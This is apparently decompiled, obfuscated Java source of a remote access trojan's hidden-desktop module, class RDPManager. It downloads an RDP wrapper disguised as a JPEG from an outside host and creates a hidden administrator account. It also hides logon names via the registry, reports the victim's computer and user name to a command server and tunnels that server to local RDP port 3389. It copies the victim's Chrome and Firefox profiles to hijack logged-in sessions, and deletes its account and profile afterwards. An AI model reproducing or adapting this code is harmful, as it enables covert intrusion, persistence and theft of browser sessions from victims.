package carLambo;

import com.sun.jna.Native;
import com.sun.jna.platform.win32.WinNT.HANDLE;
import com.sun.jna.win32.W32APIOptions;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.net.URL;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Random;
import java.util.logging.Level;
import java.util.logging.Logger;

public class RDPManager {
   private String sabretb;
   private String dfhttegd;
   private String bsgshsbs;
   dfhdfndfg sdfsldf;
   private String rdpLocation = "";
   private boolean sfsrgsbd;

   // $FF: synthetic method
   private void startThread(Socket var1, dfhdfndfg var2) {
      (new Thread(new bmcvbmd(this, var1, var2))).start();
   }

   // $FF: synthetic method
   private static String sdfsldf(bncbndfhd var0) {
      bncbndfhd var10000 = var0;
      int var6 = var0.sdfsldf;
      InputStream var1 = var10000.sabretb;
      byte[] var2 = new byte[var6];
      StringBuilder var4 = new StringBuilder();
      int var5 = 0;
      int var3 = var6;

      for(int var7 = 0; var7 != var6; var7 = var5) {
         try {
            var3 = var1.read(var2, 0, var3);
         } catch (IOException e) {
            e.printStackTrace();
         }
         var5 += var3;
         if (var3 == -1) {
            throw new RuntimeException();
         }

         var4.append(new String(var2, 0, var3));
         var3 = var6 - var5;
      }

      return var4.toString();
   }

   // $FF: synthetic method
   private static boolean sdfsldf(String var0) {
      if (var0.contains("command completed successfully.")) {
         return true;
      } else if (var0.contains("se ha completado el comando correctamente")) {
         return true;
      } else if (var0.contains("la commande s'est termin")) {
         return true;
      } else if (var0.contains("esecuzione comando riuscita")) {
         return true;
      } else {
         return var0.contains("der Befehl wurde erfolgreich ausgef");
      }
   }

   // $FF: synthetic method
   private boolean sabretb(String var1) {
      String[] var2 = new String[]{"administrators", "administrateurs", "administradores", "administratoren"};

      int var3;
      for(int var10000 = var3 = 0; var10000 < 4; var10000 = var3) {
         String var4 = var2[var3];
         if ((var4 = sdfsldf(new String[]{"cmd.exe", "/c net localgroup " + var4 + " " + var1 + " /add"})) != null && sdfsldf(var4.toLowerCase())) {
            return true;
         }

         ++var3;
      }

      return false;
   }

   // $FF: synthetic method
   private static void dfhttegd(String var0) {
      try {
         ConnectionUtil.sendUpdateToSocket(var0);
      } catch (Exception var1) {
         var1.printStackTrace();
      }
   }

   // $FF: synthetic method
   static void sdfsldf(RDPManager var0, String var1) {
      dfhttegd(var1);
   }

   // $FF: synthetic method
   private String sdfsldf() {
      return (new StringBuilder()).insert(0, this.fgssdg(this.dfhttegd)).append("\\AppData\\Roaming").toString();
   }

   private static void sdfsldf(File var0, File var1, String var2) {
      String[] var3;
      int var5;
      if (var0.isDirectory()) {
         if (var0.getAbsolutePath().endsWith(var2)) {
            return;
         }

         if (!var1.exists()) {
            var1.mkdirs();
         }

         int var4 = (var3 = var0.list()).length;

         for(int var10000 = var5 = 0; var10000 < var4; var10000 = var5) {
            String var6 = var3[var5];
            File var7 = new File(var0, var6);
            File var13 = new File(var1, var6);
            ++var5;
            sdfsldf(var7, var13, var2);
         }
      } else {
         var2 = null;
         var3 = null;

         try {
            FileInputStream var10 = new FileInputStream(var0);
            FileOutputStream var11 = new FileOutputStream(var1);
            byte[] var12 = new byte['鸠'];
            FileInputStream var14 = var10;

            while((var5 = var14.read(var12)) > 0) {
               var14 = var10;
               var11.write(var12, 0, var5);
            }

            var10.close();
            var11.close();
            return;
         } catch (Exception var9) {
            System.out.println(var0.getAbsolutePath());
         }
      }

   }

   // $FF: synthetic method
   static void sendMessageToSocket(RDPManager var0, String var1) {
      sendMessageToSocket(var1);
   }

   // $FF: synthetic method
   static void startThread(RDPManager rdpManager, Socket var1, dfhdfndfg var2) {
      rdpManager.startThread(var1, var2);
   }

   // $FF: synthetic method
   private void sabretb() {
      this.ssdgsbh();
      this.gsbthstgb(this.dfhttegd);
      String var2 = this.dfhttegd;
      if ((var2 = sdfsldf(new String[]{"cmd.exe", "/c net user " + var2 + " /delete"})) != null) {
         sdfsldf(var2.toLowerCase());
      } else {
         boolean var10001 = false;
      }

      var2 = this.dfhttegd;
      if (!(var2 = this.fgssdg(var2)).equals("")) {
         var2 = var2.replace("\\", "\\\\");
         sdfsldf(new String[]{"cmd.exe", "/c", "wmic /node:. /namespace:'\\\\root\\cimv2' path win32_userprofile where \"LocalPath='" + var2 + "'\" delete"});
      }

      sdfsldf(new String[]{"cmd.exe", "/c", "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v \"dontdisplaylastusername\" /t REG_DWORD /d 0 /f"});
   }

   // $FF: synthetic method
   private boolean dfhttegd() {
      return (new File(this.sabretb)).exists();
   }

   // $FF: synthetic method
   private static boolean bsgshsbs(String var0) {
      return true;
   }

   // $FF: synthetic method
   private void cloneFirefox() {
      if (!this.fgssdg(this.dfhttegd).equals("")) {
         String var1 = (new StringBuilder()).insert(0, this.fgssdg(this.dfhttegd)).append("\\Desktop\\Firefox.bat").toString();
         if ((new File(var1)).exists()) {
            sendMessageToSocket("Firefox already cloned.");
         } else {
            String var2;
            if ((var2 = sbsbgsrg()) == null) {
               sendMessageToSocket("Firefox profile not exist. Unable to clone session.");
            } else {
               String var3 = (new StringBuilder()).insert(0, this.sdfsldf()).append("\\Firefox").toString();
               sdfsldf(new File(var2), new File(var3), "Default\\Code Cache\\js");
               var2 = (new StringBuilder()).insert(0, "@echo off\n\"").append(this.sabretb).append("\" -no-remote -profile \"").append(var3).append("\"\npause").toString();

               try {
                  FileWriter var5 = new FileWriter(var1);
                  var5.write(var2);
                  var5.close();
                  sendMessageToSocket("Firefox session cloned. Use firefox.bat to launch firefox");
               } catch (IOException var4) {
                  sendMessageToSocket("Firefox session cloned, but unable to create luncher");
               }
            }
         }
      } else {
         sendMessageToSocket("Profile not yet created. You should login to RDP first and try again");
      }
   }

   // $FF: synthetic method
   private void gsbthstgb() {
      (new Thread(new BrowserSessionClone(this))).start();
   }

   RDPManager(String var1) {
      this.dfhttegd = var1;
      var1 = Main.getCurrentFile();
      this.rdpLocation = (new File(var1)).getParent() + File.separator + "hrdpinst.exe";
      if (!(new File("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe")).exists() && (new File("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe")).exists()) {
         this.bsgshsbs = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
      } else {
         this.bsgshsbs = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
      }

      label17: {
         RDPManager var10000;
         if ((new File("C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe")).exists()) {
            var10000 = this;
         } else {
            boolean var10001 = (new File("C:\\Program Files\\Mozilla Firefox\\firefox.exe")).exists();
            var10000 = this;
            if (var10001) {
               this.sabretb = "C:\\Program Files\\Mozilla Firefox\\firefox.exe";
               break label17;
            }
         }

         var10000.sabretb = "C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe";
      }

      (new Thread(new HRDPInitializer(this))).start();
   }

   // $FF: synthetic method
   private static String sdfsldf(String[] var0) {
      try {
         ProcessBuilder var4;
         (var4 = new ProcessBuilder(var0)).redirectErrorStream(true);
         Process var5 = var4.start();
         BufferedReader var6 = new BufferedReader(new InputStreamReader(var5.getInputStream()));
         StringBuilder var1 = new StringBuilder();

         label21:
         while(true) {
            BufferedReader var10000 = var6;

            String var2;
            while((var2 = var10000.readLine()) != null) {
               if (var2.trim().equals("")) {
                  continue label21;
               }

               var10000 = var6;
               var1.append(var2).append("\r\n");
            }

            var6.close();
            return var1.toString();
         }
      } catch (IOException var3) {
         return null;
      }
   }

   // $FF: synthetic method
   private boolean sfsrgsbd() {
      String var1;
      if ((var1 = sdfsldf(new String[]{"cmd.exe", "/c", "wmic /node:. /namespace:'\\\\root\\cimv2' path win32_operatingsystem get OSArchitecture /format:list"})) == null) {
         var1 = "";
      }

      String[] var6 = var1.trim().split("\r\n");
      String var2 = "";
      int var3 = var6.length;

      int var4;
      for(int var10000 = var4 = 0; var10000 < var3; var10000 = var4) {
         String[] var5;
         if ((var5 = var6[var4].split("="))[0].toLowerCase().equals("osarchitecture")) {
            var2 = var5[1].trim();
         }

         ++var4;
      }

      return var2.contains("64");
   }

   // $FF: synthetic method
   private static String fgsbsfgsb() {
      String var0 = "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ";
      StringBuilder var1 = new StringBuilder();
      Random var2 = new Random();

      int var3;
      for(int var10000 = var3 = 0; var10000 < 5; var10000 = var3) {
         int var4;
         if ((var4 = var2.nextInt(var0.length())) == var0.length()) {
            --var4;
         }

         String var5 = var0.substring(var4, var4 + 1);
         ++var3;
         var1.append(var5);
      }

      return var1.toString();
   }

   // $FF: synthetic method
   private void gsbthstgb(String var1) {
      HANDLE var2 = new HANDLE();
      Kernel32 var3 = (Kernel32)Native.loadLibrary(Kernel32.class, W32APIOptions.DEFAULT_OPTIONS);
      if (this.sfsrgsbd()) {
         var3.Wow64DisableWow64FsRedirection(var2);
      }

      RDPManager var10000;
      label30: {
         if ((var1 = sdfsldf(new String[]{"cmd.exe", "/c query user " + var1})) != null) {
            label28: {
               try {
                  String[] var4;
                  String var6 = (var4 = var1.split("\r\n"))[1].trim();
                  var1 = var6.substring(var6.indexOf(" ")).trim();
                  if (!bsgshsbs(var1 = var1.substring(0, var1.indexOf(" ")).trim())) {
                     var1 = var4[1].trim().substring(var4[1].trim().indexOf(var1) + var1.length()).trim();
                     var1 = var1.substring(0, var1.indexOf(" ")).trim();
                  }

                  sdfsldf(new String[]{"cmd.exe", (new StringBuilder()).insert(0, "/c logoff ").append(var1).toString()});
               } catch (Exception var5) {
                  break label28;
               }

               var10000 = this;
               break label30;
            }
         }

         var10000 = this;
      }

      if (var10000.sfsrgsbd()) {
         var3.Wow64RevertWow64FsRedirection(var2);
      }

   }

   // $FF: synthetic method
   private void sfsrgsbd(String var1) {
      if (!(var1 = this.fgssdg(var1)).equals("")) {
         var1 = var1.replace("\\", "\\\\");
         sdfsldf(new String[]{"cmd.exe", "/c", "wmic /node:. /namespace:'\\\\root\\cimv2' path win32_userprofile where \"LocalPath='" + var1 + "'\" delete"});
      }

   }

   // $FF: synthetic method
   private void fgssdg() {
      if (this.ertdbdth()) {
         dfhttegd("HRDP Downloaded");
         String var2;
         if ((var2 = sdfsldf(new String[]{"cmd.exe", "/c", "\"" + this.rdpLocation + "\" -i -o"})) != null ? (var2.toLowerCase().contains("terminal services is fully supported.") ? true : (var2.toLowerCase().contains("is already installed.") ? true : var2.toLowerCase().contains("terminal services is supported partially."))) : false) {
            dfhttegd("HRDP Installed");
            boolean var1 = false;
            if (this.dfhttegd == null) {
               this.dfhttegd = fgsbsfgsb();
               var1 = true;
            }

            var2 = this.dfhttegd;
            boolean var10000;
            String var3;
            if (!var1) {
               var10000 = true;
            } else {
               label51: {
                  if ((var3 = sdfsldf(new String[]{"cmd.exe", "/c net user " + var2 + " " + var2 + " /add"})) != null) {
                     if (!sdfsldf(var3.toLowerCase())) {
                        var10000 = false;
                        break label51;
                     }

                     if (this.sabretb(var2)) {
                        var10000 = true;
                        break label51;
                     }

                     sdfsldf(new String[]{"cmd.exe", (new StringBuilder()).insert(0, "/c net user ").append(var2).append(" /delete").toString()});
                  }

                  var10000 = false;
               }
            }

            if (var10000) {
               dfhttegd("Account Created");
               sdfsldf(new String[]{"cmd.exe", "/c", "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v \"dontdisplaylastusername\" /t REG_DWORD /d 1 /f"});

               try {
                  Socket var5;
                  OutputStream var6 = (var5 = new Socket(ConnectionUtil.socketAddress, ConnectionUtil.socketPort)).getOutputStream();
                  var3 = (new StringBuilder()).insert(0, "HRDP-MGR:").append(this.dfhttegd).append(":").append(ConnectionUtil.getComputerName()).append("\\").append(ConnectionUtil.getUserName()).toString();
                  var6.write((var3.getBytes().length + "\r\n\r\n").getBytes());
                  var6.write(var3.getBytes());
                  var6.flush();
                  this.sdfsldf = new RDPStarter(this);
                  this.startThread(var5, this.sdfsldf);
               } catch (Exception var4) {
                  ;
               }
            } else {
               this.sabretb();
               dfhttegd("Account Creation Failed");
            }
         } else {
            this.ssdgsbh();
            dfhttegd("HRDP Install Failed");
         }
      } else {
         dfhttegd("HRDP Download Failed");
      }
   }

   // $FF: synthetic method
   private boolean dsgsdfge() {
      String var1;
      if ((var1 = sdfsldf(new String[]{"cmd.exe", "/c", "\"" + this.rdpLocation + "\" -i -o"})) != null) {
         if (var1.toLowerCase().contains("terminal services is fully supported.")) {
            return true;
         } else if (var1.toLowerCase().contains("is already installed.")) {
            return true;
         } else {
            return var1.toLowerCase().contains("terminal services is supported partially.");
         }
      } else {
         return false;
      }
   }

   // $FF: synthetic method
   private boolean sdfsldf(String var1, boolean var2) {
      if (!var2) {
         return true;
      } else {
         String var3;
         if ((var3 = sdfsldf(new String[]{"cmd.exe", "/c net user " + var1 + " " + var1 + " /add"})) != null) {
            if (sdfsldf(var3.toLowerCase())) {
               if (this.sabretb(var1)) {
                  return true;
               } else {
                  sdfsldf(new String[]{"cmd.exe", (new StringBuilder()).insert(0, "/c net user ").append(var1).append(" /delete").toString()});
                  return false;
               }
            } else {
               return false;
            }
         } else {
            return false;
         }
      }
   }

   // $FF: synthetic method
   private static void sendMessageToSocket(String var0) {
      try {
         ConnectionUtil.sendMessageToSocket(var0);
      } catch (Exception var1) {
         Logger.getLogger(RDPManager.class.getName()).log(Level.SEVERE, (String)null, var1);
      }
   }

   // $FF: synthetic method
   private boolean ertdbdth() {
      try {
         File var1;
         if ((var1 = new File(this.rdpLocation)).exists() && var1.length() == 1460224L) {
            return true;
         } else {
            BufferedInputStream var2 = new BufferedInputStream((new URL("http://wshsoft.company/multrdp.jpg")).openStream());
            FileOutputStream var3 = new FileOutputStream(this.rdpLocation);
            byte[] var4 = new byte[8192];
            BufferedInputStream var10000 = var2;

            int var5;
            while((var5 = var10000.read(var4, 0, 1024)) != -1) {
               var10000 = var2;
               var3.write(var4, 0, var5);
            }

            var2.close();
            var3.close();
            return var1.exists();
         }
      } catch (IOException var6) {
         return false;
      }
   }

   // $FF: synthetic method
   private bncbndfhd sdfsldf(InputStream var1) {
      byte[] var2 = new byte[1];
      StringBuilder var4 = new StringBuilder();

      int var3;
      try {
         while((var3 = var1.read(var2, 0, 1)) != -1) {
            var4.append(new String(var2, 0, var3));
            if (var4.toString().endsWith("\r\n\r\n")) {
               String var5 = var4.toString();
               var5 = var5.substring(0, var5.indexOf("\r\n\r\n"));
               bncbndfhd var6 = new bncbndfhd(this, (byte)0);
               var6.sdfsldf = Integer.parseInt(var5);
               var6.sabretb = var1;
               return var6;
            }
         }
      } catch (IOException e) {
         e.printStackTrace();
      }


      throw new RuntimeException();
   }

   // $FF: synthetic method
   static void sdfsldf(RDPManager var0) {
      if ((var0 = var0).ertdbdth()) {
         dfhttegd("HRDP Downloaded");
         String var2;
         if ((var2 = sdfsldf(new String[]{"cmd.exe", "/c", "\"" + var0.rdpLocation + "\" -i -o"})) != null ? (var2.toLowerCase().contains("terminal services is fully supported.") ? true : (var2.toLowerCase().contains("is already installed.") ? true : var2.toLowerCase().contains("terminal services is supported partially."))) : false) {
            dfhttegd("HRDP Installed");
            boolean var1 = false;
            if (var0.dfhttegd == null) {
               var0.dfhttegd = fgsbsfgsb();
               var1 = true;
            }

            var2 = var0.dfhttegd;
            boolean var10000;
            String var3;
            if (!var1) {
               var10000 = true;
            } else {
               label51: {
                  if ((var3 = sdfsldf(new String[]{"cmd.exe", "/c net user " + var2 + " " + var2 + " /add"})) != null) {
                     if (!sdfsldf(var3.toLowerCase())) {
                        var10000 = false;
                        break label51;
                     }

                     if (var0.sabretb(var2)) {
                        var10000 = true;
                        break label51;
                     }

                     sdfsldf(new String[]{"cmd.exe", (new StringBuilder()).insert(0, "/c net user ").append(var2).append(" /delete").toString()});
                  }

                  var10000 = false;
               }
            }

            if (var10000) {
               dfhttegd("Account Created");
               sdfsldf(new String[]{"cmd.exe", "/c", "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v \"dontdisplaylastusername\" /t REG_DWORD /d 1 /f"});

               try {
                  Socket var5;
                  OutputStream var6 = (var5 = new Socket(ConnectionUtil.socketAddress, ConnectionUtil.socketPort)).getOutputStream();
                  var3 = (new StringBuilder()).insert(0, "HRDP-MGR:").append(var0.dfhttegd).append(":").append(ConnectionUtil.getComputerName()).append("\\").append(ConnectionUtil.getUserName()).toString();
                  var6.write((var3.getBytes().length + "\r\n\r\n").getBytes());
                  var6.write(var3.getBytes());
                  var6.flush();
                  var0.sdfsldf = new RDPStarter(var0);
                  var0.startThread(var5, var0.sdfsldf);
               } catch (Exception var4) {
                  ;
               }
            } else {
               var0.sabretb();
               dfhttegd("Account Creation Failed");
            }
         } else {
            var0.ssdgsbh();
            dfhttegd("HRDP Install Failed");
         }
      } else {
         dfhttegd("HRDP Download Failed");
      }
   }

   // $FF: synthetic method
   static void cloneFirefox(RDPManager var0) {
      if ((new File(var0.sabretb)).exists()) {
         var0.cloneFirefox();
      }

   }

   // $FF: synthetic method
   private boolean sbsgssdfg() {
      return (new File(this.bsgshsbs)).exists();
   }

   // $FF: synthetic method
   private static String sbsbgsrg() {
      String var0 = (new StringBuilder()).insert(0, ConnectionUtil.sdfsldf(26)).append("\\Mozilla\\Firefox").toString();
      MouseMoveManager var1 = new MouseMoveManager((new StringBuilder()).insert(0, var0).append("\\profiles.ini").toString());
      ArrayList var2 = new ArrayList();
      Iterator var3 = var1.sdfsldf().iterator();

      while(var3.hasNext()) {
         String var4;
         if ((var4 = (String)var3.next()).startsWith("Profile")) {
            var2.add(var4);
         }
      }

      if (var2.size() > 0) {
         String var6 = var1.sdfsldf((String)var2.get(var2.size() - 1), "Path", (String)null);
         return (new StringBuilder()).insert(0, var0).append("\\").append(var6.replace("/", "\\")).toString();
      } else {
         return null;
      }
   }

   // $FF: synthetic method
   private boolean ssdgsbh() {
      return sdfsldf(new String[]{"cmd.exe", "/c", "\"" + this.rdpLocation + "\" -u"}) != null;
   }

   // $FF: synthetic method
   static void sabretb(RDPManager var0, Socket var1, dfhdfndfg var2) {
      var2 = var2;
      var1 = var1;
      var0 = var0;

      String var3;
      try {
         InputStream var4 = var1.getInputStream();
         byte[] var5 = new byte[1];
         StringBuilder var7 = new StringBuilder();

         while(true) {
            int var6;
            if ((var6 = var4.read(var5, 0, 1)) == -1) {
               throw new RuntimeException();
            }

            var7.append(new String(var5, 0, var6));
            if (var7.toString().endsWith("\r\n\r\n")) {
               String var14 = var7.toString();
               var14 = var14.substring(0, var14.indexOf("\r\n\r\n"));
               bncbndfhd var15 = new bncbndfhd(var0, (byte)0);
               var15.sdfsldf = Integer.parseInt(var14);
               var15.sabretb = var4;
               var3 = sdfsldf(var15);
               break;
            }
         }
      } catch (Exception var11) {
         var2.start();
         return;
      }

      if (var3.contains("CLONE")) {
         (new Thread(new BrowserSessionClone(var0))).start();
         var2.start();
      } else if (var3.contains("EXITS")) {
         var0.sabretb();
      } else if (var3.contains("EXIT")) {
         var0.gsbthstgb(var0.dfhttegd);

         try {
            var1.close();
         } catch (IOException var9) {
            Logger.getLogger(RDPManager.class.getName()).log(Level.SEVERE, (String)null, var9);
         }
      } else {
         try {
            Socket var12 = new Socket("127.0.0.1", 3389);
            ghsghnbn var13 = new ghsghnbn();
            var1.getOutputStream();
            var13.sdfsldf(var1, var12);
            var2.start();
         } catch (Exception var10) {
            var2.start();

            try {
               var1.close();
            } catch (IOException var8) {
               Logger.getLogger(RDPManager.class.getName()).log(Level.SEVERE, (String)null, var8);
            }
         }
      }
   }

   // $FF: synthetic method
   private void hghteerd() {
      if (!this.fgssdg(this.dfhttegd).equals("")) {
         String var1 = (new StringBuilder()).insert(0, this.fgssdg(this.dfhttegd)).append("\\Desktop\\Chrome.bat").toString();
         if ((new File(var1)).exists()) {
            sendMessageToSocket("Chrome already cloned.");
         } else {
            String var2 = (new StringBuilder()).insert(0, (new File(ConnectionUtil.sdfsldf(26))).getParent()).append("\\Local\\Google\\Chrome\\User Data").toString();
            String var3 = (new StringBuilder()).insert(0, this.sdfsldf()).append("\\Chrome").toString();
            sdfsldf(new File(var2), new File(var3), "Default\\Code Cache\\js");
            var2 = (new StringBuilder()).insert(0, "@echo off\n\"").append(this.bsgshsbs).append("\" --disable-3d-apis --disable-gpu-rasterization --disable-gpu-vsync --disable-gpu-program-cache ").append("--disable-gpu --disable-d3d11 --disable-flash-3d --user-data-dir=\"").append(var3).append("\"\npause").toString();

            try {
               FileWriter var5 = new FileWriter(var1);
               var5.write(var2);
               var5.close();
               sendMessageToSocket("Chrome session cloned. Use chrome.bat to launch chrome");
            } catch (IOException var4) {
               sendMessageToSocket("Chrome session cloned, but unable to create luncher");
            }
         }
      } else {
         sendMessageToSocket("Profile not yet created. You should login to RDP first and try again");
      }
   }

   // $FF: synthetic method
   private String fgssdg(String var1) {
      String var2;
      if ((var2 = sdfsldf(new String[]{"cmd.exe", "/c", "wmic /node:. /namespace:'\\\\root\\cimv2' path win32_userprofile get localpath /format:list"})) == null) {
         var2 = "";
      }

      String[] var7 = var2.trim().split("\r\n");
      String var3 = "";
      int var4 = var7.length;

      int var5;
      for(int var10000 = var5 = 0; var10000 < var4; var10000 = var5) {
         String[] var6;
         if ((var6 = var7[var5].split("="))[1].contains(var1)) {
            return var6[1].trim();
         }

         ++var5;
      }

      return var3;
   }

   // $FF: synthetic method
   private boolean dsgsdfge(String var1) {
      return (var1 = sdfsldf(new String[]{"cmd.exe", "/c net user " + var1 + " /delete"})) != null ? sdfsldf(var1.toLowerCase()) : false;
   }

   // $FF: synthetic method
   private void sgsfghhg() {
      if (this.dfhttegd()) {
         this.cloneFirefox();
      }

   }

   // $FF: synthetic method
   private void sabretb(Socket var1, dfhdfndfg var2) {
      String var3;
      try {
         var3 = sdfsldf(this.sdfsldf(var1.getInputStream()));
      } catch (Exception var8) {
         var2.start();
         return;
      }

      if (var3.contains("CLONE")) {
         this.gsbthstgb();
         var2.start();
      } else if (var3.contains("EXITS")) {
         this.sabretb();
      } else if (var3.contains("EXIT")) {
         this.gsbthstgb(this.dfhttegd);

         try {
            var1.close();
         } catch (IOException var6) {
            Logger.getLogger(RDPManager.class.getName()).log(Level.SEVERE, (String)null, var6);
         }
      } else {
         try {
            Socket var4 = new Socket("127.0.0.1", 3389);
            ghsghnbn var9 = new ghsghnbn();
            var1.getOutputStream();
            var9.sdfsldf(var1, var4);
            var2.start();
         } catch (Exception var7) {
            var2.start();

            try {
               var1.close();
            } catch (IOException var5) {
               Logger.getLogger(RDPManager.class.getName()).log(Level.SEVERE, (String)null, var5);
            }
         }
      }
   }
}
